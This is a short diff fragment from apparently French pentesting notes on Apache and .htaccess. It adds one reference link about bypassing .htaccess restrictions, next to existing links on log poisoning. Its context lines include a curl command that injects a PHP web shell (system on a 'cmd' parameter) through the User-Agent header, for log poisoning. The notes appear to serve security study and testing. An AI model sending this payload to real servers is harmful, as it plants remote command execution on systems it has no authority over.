@@ -231,6 +231,7 @@ et `.htaccess`
 
 - https://bughra.dev/posts/log-poison/
 - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache
+- https://web.archive.org/web/20120818120202/http://www.ghostsinthestack.org/article-26-bypasser-les-htaccess-avec-limit.html
 
 ```bash
 curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
